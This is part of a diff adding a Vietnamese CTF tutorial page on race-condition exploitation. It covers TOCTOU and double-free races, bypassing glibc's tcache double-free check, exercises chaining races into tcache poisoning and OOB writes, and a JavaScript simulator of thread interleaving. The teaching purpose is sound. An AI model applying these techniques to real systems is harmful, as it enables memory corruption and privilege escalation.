+      <tr><td>TOCTOU file (access→open)</td><td>symlink swap → đọc/ghi file quyền cao</td></tr>
+      <tr><td>Auth race</td><td>kiểm quyền rồi thao tác → đổi quyền ở giữa</td></tr>
+      <tr><td>fd race (dup)</td><td>fd đóng/mở lại → thao tác nhầm file</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc/glibc</span>tcache double-free key check (glibc ≥2.29): một thread free tuần tự thì bị bắt, nhưng race thật (2 thread free gần như đồng thời) vẫn qua vì cả hai thấy key chưa set. Kernel/userland race nguyên lý giống nhau (TOCTOU). Đa lõi (SMP) dễ thắng hơn 1 lõi.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · double-free race</div><p>2 thread free idx 0 → tcache dup → poisoning.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · TOCTOU count</div><p>remove vs edit → OOB write idx vượt biên.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · ổn định remote</div><p>Đo tỉ lệ, dồn packet, nhiều socket đạt &gt;50%.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">atomic</div><p>Chạy trọn gói.</p></div>
+    <div class="card"><div class="term">race condition</div><p>Phụ thuộc thứ tự luồng.</p></div>
+    <div class="card"><div class="term">TOCTOU</div><p>Khe kiểm→dùng.</p></div>
+    <div class="card"><div class="term">cửa sổ đua</div><p>Thời gian chen được.</p></div>
+    <div class="card"><div class="term">double-free</div><p>Free 1 chunk 2 lần.</p></div>
+    <div class="card"><div class="term">mutex</div><p>Khóa nối tiếp hóa.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Hệ quả heap: <a href="heap_bugs.html">heap bugs</a> · <a href="tcache_fastbin.html">tcache poisoning</a> · <a href="oob.html">OOB</a>. Nguồn: <a href="hook_overwrite.html">__free_hook</a>.</li>
+    <li>CWE-362 (race) · CWE-367 (TOCTOU) · Dirty COW (kernel race kinh điển).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · Concurrency.</strong> Giữa kiểm tra và dùng có khe → luồng khác chen → double-free / OOB / auth bypass. Thắng đua: lặp nhiều, mở rộng cửa sổ, dồn packet, nhiều thread. Race là xác suất.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("race-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("race-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var ops={t1a:document.getElementById("t1a"),t1b:document.getElementById("t1b"),t2a:document.getElementById("t2a"),t2b:document.getElementById("t2b")};
+  var verdict=document.getElementById("rbVerdict"),stat=document.getElementById("rbStat");
+  var runs=0,wins=0;
+  function clear(){Object.keys(ops).forEach(function(k){ops[k].classList.remove("hit");});}
+  function one(animate){
+    // mô phỏng: xen kẽ 4 op (t1a,t1b,t2a,t2b) theo thứ tự ngẫu nhiên.
+    // double-free khi t2a đứng TRƯỚC t1b (T2 kiểm trước khi T1 free) -> cả 2 thấy !freed
+    var order=["t1a","t1b","t2a","t2b"];
+    for(var i=order.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=order[i];order[i]=order[j];order[j]=t;}
+    var i1a=order.indexOf("t1a"),i1b=order.indexOf("t1b"),i2a=order.indexOf("t2a"),i2b=order.indexOf("t2b");
+    // double-free: cả hai kiểm (①) trước khi bất kỳ free (③) nào xảy ra
+    var dfree = (Math.max(i1a,i2a) < Math.min(i1b,i2b));
+    runs++; if(dfree)wins++;
+    stat.textContent = runs+" lần · thắng "+wins+" ("+Math.round(wins/runs*100)+"%)";
+    if(dfree){verdict.className="verdict win";verdict.innerHTML="💥 DOUBLE-FREE! cả T1 &amp; T2 qua kiểm ① trước khi free ③ → free 2 lần cùng chunk.";}
+    else{verdict.className="verdict lose";verdict.innerHTML="— an toàn lần này (một luồng free &amp; set freed=1 trước khi luồng kia kiểm). Lặp tiếp!";}
+    if(animate){clear();order.forEach(function(k,idx){setTimeout(function(){ops[k].classList.add("hit");},idx*180);});}
+  }
+  document.getElementById("raceBtn").addEventListener("click",function(){one(true);});
+  document.getElementById("race100Btn").addEventListener("click",function(){clear();for(var i=0;i<100;i++)one(false);});
+  one(false);
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
